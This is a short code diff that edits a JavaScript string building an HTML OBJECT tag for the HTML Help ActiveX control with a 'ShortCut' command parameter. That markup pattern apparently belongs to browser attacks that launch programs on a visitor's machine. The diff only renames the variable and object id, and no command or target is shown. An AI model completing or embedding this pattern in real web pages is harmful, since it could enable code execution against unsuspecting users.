@@ -1,4 +1,4 @@
-var a = '<OBJECT id="exec" classid="clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11" width=1 height="1">\
+var t = '<OBJECT id="e" classid="clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11" width=1 height="1">\
 
 <PARAM name="Command" value="ShortCut">\
 
